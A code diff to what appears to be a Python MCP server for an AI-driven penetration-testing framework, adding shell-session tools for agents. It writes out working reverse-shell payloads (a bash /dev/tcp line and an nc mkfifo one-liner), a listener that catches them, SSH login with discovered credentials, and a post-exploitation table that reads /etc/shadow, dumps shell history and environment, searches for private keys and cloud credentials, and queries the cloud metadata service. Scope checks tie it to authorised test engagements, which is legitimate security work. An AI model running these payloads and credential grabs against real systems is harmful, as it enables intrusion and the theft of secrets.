@@ -10,9 +10,20 @@ See ~/Mr. Robot/adr/ for the design.
 from __future__ import annotations
 
 import os
+import select as _select
+import socket as _socket
 import subprocess
+import threading
+import time
+import uuid
 import xml.etree.ElementTree as ET
 from pathlib import Path
+
+try:
+    import paramiko as _paramiko
+    _PARAMIKO = True
+except ImportError:
+    _PARAMIKO = False
 
 from mcp.server.fastmcp import FastMCP
 
@@ -38,6 +49,14 @@ try:
         "MR_ROBOT_RECON_DEADLINE_SECONDS", "600"))
 except ValueError:
     RECON_DEADLINE = 600
+
+try:
+    SHELL_READ_IDLE = float(os.environ.get("MR_ROBOT_SHELL_READ_IDLE", "1.0"))
+except ValueError:
+    SHELL_READ_IDLE = 1.0
+
+_SHELL_SENTINEL = "__MRROBOT_DONE__"
+_SHELLS: dict[str, dict] = {}  # session_id -> session state
 
 ENGAGE_DIR.mkdir(parents=True, exist_ok=True)
 
@@ -140,7 +159,9 @@ def arcade_post_finding(box_name: str, type: str, data: dict,
                         source_robot: str = "") -> str:
     """Post a finding to the arcade and fire the playbook's unlock rules.
     `type` is one of: port, service, web_path, credential, cve, foothold,
-    privesc_vector, flag. A `flag` finding records the engagement flag."""
+    privesc_vector, flag, edr_verdict. A `flag` finding records the engagement
+    flag. An `edr_verdict` finding records the result of a post-exploitation
+    action: {action, verdict: permitted|blocked, source, evidence}."""
     try:
         eng = ARC.require_engagement(box_name)
         pb = _playbook(eng["playbook"])
@@ -383,6 +404,327 @@ def recon_portscan(box_name: str, target: str, top_ports: int = 100) -> str:
         lines.append(f"-- arcade unlocked {len(spawned)} task(s) --")
         lines += [_fmt_task(t) for t in spawned]
     return "\n".join(lines)
+
+
+# --- tools : shell sessions ------------------------------------------------
+_POST_EX_ACTIONS: dict[str, str] = {
+    "process_enum":     "ps aux 2>/dev/null",
+    "sudo_check":       "sudo -l 2>&1",
+    "suid_search":      "find / -perm -4000 -type f 2>/dev/null | head -30",
+    "cron_enum":        "cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null",
+    "network_enum":     "ip addr 2>/dev/null; ss -tulnp 2>/dev/null",
+    "history_dump":     "cat ~/.bash_history ~/.zsh_history 2>/dev/null | tail -50",
+    "env_dump":         "env 2>/dev/null",
+    "credential_search": (
+        "find / -maxdepth 6 \\( -name '*.pem' -o -name '*.key' -o -name 'id_rsa'"
+        " -o -name 'credentials' -o -name '.aws' -o -name 'wp-config.php' \\)"
+        " -readable 2>/dev/null | head -20"
+    ),
+    "cloud_metadata": (
+        "curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null"
+        " || curl -sf --max-time 3 -H 'Metadata: true'"
+        " 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"
+        " 2>/dev/null || echo no_cloud_metadata"
+    ),
+    "shadow_read":  "cat /etc/shadow 2>&1",
+    "passwd_read":  "cat /etc/passwd 2>/dev/null",
+}
+
+_EDR_BLOCK_SIGNALS = frozenset([
+    "permission denied", "operation not permitted", "access denied",
+    "killed", "not allowed", "cannot open",
+])
+
+
+def _auto_verdict(output: str) -> str:
+    """Heuristic: short output that is purely an error string → blocked."""
+    stripped = (output or "").strip()
+    if not stripped or stripped == "no_cloud_metadata":
+        return "blocked"
+    if len(stripped) < 120 and any(p in stripped.lower()
+                                   for p in _EDR_BLOCK_SIGNALS):
+        return "blocked"
+    return "permitted"
+
+
+def _shell_sid() -> str:
+    return uuid.uuid4().hex[:8]
+
+
+def _post_foothold(eng: dict, method: str, user: str, source: str,
+                   hat: str = "white-hat") -> None:
+    ARC.post_finding(
+        eng["id"], "foothold",
+        {"method": method, "user": user, "source": source},
+        source_hat=hat, source_robot="shell",
+    )
+
+
+@mcp.tool()
+def shell_listen(box_name: str, lhost: str, lport: int,
+                 accept_timeout: int = 120) -> str:
+    """Start a reverse shell listener on lhost:lport. Returns a session ID
+    immediately; the session goes live when the target connects back.
+    Scope-checks the incoming IP on arrival. Posts a foothold finding.
+
+    Typical flow:
+      1. Call shell_listen → get session_id.
+      2. Trigger the payload on the target (command injection, web shell, etc.):
+             bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
+      3. Call shell_exec('<session_id>', 'id') — waits for connection, then runs."""
+    try:
+        eng = ARC.require_engagement(box_name)
+    except Exception as exc:
+        return f"X {exc}"
+
+    try:
+        srv = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+        srv.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
+        srv.bind((lhost, lport))
+        srv.listen(1)
+        srv.settimeout(accept_timeout)
+    except OSError as exc:
+        return f"X cannot bind {lhost}:{lport} — {exc}"
+
+    event = threading.Event()
+    sid = _shell_sid()
+    sess: dict = {
+        "type": "reverse", "srv": srv, "conn": None,
+        "box_name": box_name, "status": "pending",
+        "_event": event, "_eng": eng,
+    }
+    _SHELLS[sid] = sess
+
+    def _accept() -> None:
+        try:
+            conn, addr = srv.accept()
+        except OSError:
+            sess["status"] = "closed"
+            event.set()
+            return
+        try:
+            scope.enforce(addr[0], [eng["box_ip"]])
+        except scope.ScopeError as exc:
+            conn.close()
+            sess["status"] = "closed"
+            sess["_error"] = f"SCOPE VIOLATION — incoming {addr[0]}: {exc}"
+            event.set()
+            return
+        conn.settimeout(None)
+        sess["conn"] = conn
+        sess["addr"] = addr
+        sess["status"] = "live"
+        _post_foothold(eng, "reverse_shell", "unknown", addr[0])
+        event.set()
+
+    threading.Thread(target=_accept, daemon=True,
+                     name=f"shell-accept-{sid}").start()
+
+    return (f"+ reverse shell listener on {lhost}:{lport}  session={sid}\n"
+            f"  waiting up to {accept_timeout}s for the target to connect.\n"
+            f"  trigger payload, then call: shell_exec('{sid}', 'id')\n"
+            f"  bash payload: bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n"
+            f"  nc payload:   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1"
+            f"|nc {lhost} {lport} >/tmp/f")
+
+
+@mcp.tool()
+def shell_open(box_name: str, target: str, user: str,
+               password: str = "", key_file: str = "",
+               port: int = 22) -> str:
+    """Open an SSH shell to target using discovered credentials. Scope-checked.
+    Returns a session ID for use with shell_exec / shell_close.
+    Provide either password or key_file (absolute path to a private key)."""
+    if not _PARAMIKO:
+        return "X paramiko not installed — pip install paramiko"
+    try:
+        eng = ARC.require_engagement(box_name)
+        scope.enforce(target, [eng["box_ip"]])
+    except Exception as exc:
+        return f"X {exc}"
+
+    if not password and not key_file:
+        return "X provide either password or key_file"
+
+    try:
+        client = _paramiko.SSHClient()
+        client.set_missing_host_key_policy(_paramiko.AutoAddPolicy())
+        kw: dict = {"username": user, "port": port, "timeout": 15}
+        if key_file:
+            kw["key_filename"] = key_file
+        else:
+            kw["password"] = password
+        client.connect(target, **kw)
+    except Exception as exc:
+        return f"X SSH connect failed: {exc}"
+
+    sid = _shell_sid()
+    _SHELLS[sid] = {
+        "type": "ssh", "client": client,
+        "box_name": box_name, "status": "live", "_eng": eng,
+    }
+    _post_foothold(eng, "ssh", user, target)
+    return (f"+ SSH session {sid} open — {user}@{target}:{port}\n"
+            f"  call shell_exec('{sid}', 'id') to verify.")
+
+
+@mcp.tool()
+def shell_exec(session_id: str, command: str, timeout: int = 30) -> str:
+    """Execute a command in an open shell session and return the output.
+    For a pending reverse session, waits up to `timeout` seconds for the
+    connection to arrive before running the command."""
+    sess = _SHELLS.get(session_id)
+    if not sess:
+        return f"X no session '{session_id}' — call shell_listen or shell_open"
+    if sess["status"] == "closed":
+        return f"X session '{session_id}' is closed"
+
+    if sess["status"] == "pending":
+        arrived = sess["_event"].wait(timeout=timeout)
+        if not arrived or sess["status"] != "live":
+            err = sess.get("_error", "timed out waiting for reverse connection")
+            return f"X {err}"
+
+    if sess["type"] == "ssh":
+        try:
+            _, stdout, stderr = sess["client"].exec_command(command,
+                                                            timeout=timeout)
+            out = stdout.read().decode(errors="replace")
+            err = stderr.read().decode(errors="replace")
+            return (out + err).rstrip() or "(no output)"
+        except Exception as exc:
+            return f"X ssh exec failed: {exc}"
+
+    # reverse shell — sentinel-terminated read
+    conn: _socket.socket = sess["conn"]
+    payload = command.rstrip() + f"; echo {_SHELL_SENTINEL}\n"
+    try:
+        conn.sendall(payload.encode())
+    except OSError as exc:
+        sess["status"] = "closed"
+        return f"X send failed (shell died?): {exc}"
+
+    output = b""
+    deadline = time.monotonic() + timeout
+    while time.monotonic() < deadline:
+        remaining = max(0.0, deadline - time.monotonic())
+        ready, _, _ = _select.select([conn], [], [],
+                                     min(remaining, SHELL_READ_IDLE))
+        if ready:
+            try:
+                chunk = conn.recv(4096)
+            except OSError as exc:
+                sess["status"] = "closed"
+                return (output.decode(errors="replace").rstrip()
+                        + f"\n(connection lost: {exc})")
+            if not chunk:
+                sess["status"] = "closed"
+                break
+            output += chunk
+            if _SHELL_SENTINEL.encode() in output:
+                break
+        elif output:
+            # idle gap after data with no sentinel — shell may have eaten echo
+            break
+
+    lines = [l for l in output.decode(errors="replace").splitlines()
+             if _SHELL_SENTINEL not in l]
+    return "\n".join(lines).strip() or "(no output)"
+
+
+@mcp.tool()
+def shell_list_sessions(box_name: str = "") -> str:
+    """List active shell sessions, optionally filtered by box_name."""
+    items = [
+        (sid, s) for sid, s in _SHELLS.items()
+        if s.get("status") != "closed"
+        and (not box_name or s.get("box_name") == box_name)
+    ]
+    if not items:
+        return f"(no active sessions{' for ' + box_name if box_name else ''})"
+    lines = []
+    for sid, s in items:
+        addr = s.get("addr", ("", ""))
+        detail = f"{addr[0]}:{addr[1]}" if s["type"] == "reverse" else ""
+        lines.append(f"  {sid}  [{s['status']:^8}]  {s['type']:<8}  "
+                     f"box={s['box_name']}  {detail}".rstrip())
+    return "\n".join(lines)
+
+
+@mcp.tool()
+def shell_post_ex(box_name: str, action: str, session_id: str = "",
+                  timeout: int = 20) -> str:
+    """Run a named post-exploitation action on an active shell session and post
+    an edr_verdict finding (permitted/blocked) to the arcade.
+    Auto-selects the most recent live session for box_name if session_id is
+    omitted. Use shell_list_sessions to see available sessions.
+
+    Actions: process_enum, sudo_check, suid_search, cron_enum, network_enum,
+             history_dump, env_dump, credential_search, cloud_metadata,
+             shadow_read, passwd_read"""
+    try:
+        eng = ARC.require_engagement(box_name)
+    except Exception as exc:
+        return f"X {exc}"
+
+    if action not in _POST_EX_ACTIONS:
+        return (f"X unknown action '{action}' — "
+                f"known: {', '.join(sorted(_POST_EX_ACTIONS))}")
+
+    # resolve session — prefer explicit, fall back to most-recent live
+    sid = session_id
+    if sid:
+        if sid not in _SHELLS:
+            return f"X no session '{sid}'"
+    else:
+        sid = next(
+            (s for s, v in reversed(list(_SHELLS.items()))
+             if v.get("box_name") == box_name and v.get("status") == "live"),
+            None,
+        )
+        if not sid:
+            return (f"X no live session for '{box_name}' — "
+                    f"call shell_listen or shell_open first")
+
+    output = shell_exec(sid, _POST_EX_ACTIONS[action], timeout=timeout)
+    verdict = _auto_verdict(output)
+    evidence = (output or "")[:600].rstrip()
+
+    pb = _playbook(eng["playbook"])
+    finding, created = ARC.post_finding(
+        eng["id"], "edr_verdict",
+        {"action": action, "verdict": verdict,
+         "source": eng["box_ip"], "evidence": evidence},
+        source_hat="purple-hat", source_robot="post-ex",
+    )
+    spawned, unlocked = _apply_unlock(eng, finding, pb) if created else ([], [])
+
+    tag = "+" if created else "~"
+    lines = [f"{tag} post_ex.{action} → {verdict.upper()}  (finding #{finding['id']})",
+             f"  evidence: {evidence[:200]}"]
+    if spawned:
+        lines.append(f"  unlocked {len(spawned)} task(s):")
+        lines += [_fmt_task(t) for t in spawned]
+    return "\n".join(lines)
+
+
+@mcp.tool()
+def shell_close(session_id: str) -> str:
+    """Close a shell session and free its resources."""
+    sess = _SHELLS.pop(session_id, None)
+    if not sess:
+        return f"X no session '{session_id}'"
+    try:
+        if sess["type"] == "reverse":
+            if sess.get("conn"):
+                sess["conn"].close()
+            if sess.get("srv"):
+                sess["srv"].close()
+        elif sess["type"] == "ssh":
+            sess["client"].close()
+    except Exception:
+        pass
+    return f"+ session '{session_id}' closed"
 
 
 if __name__ == "__main__":
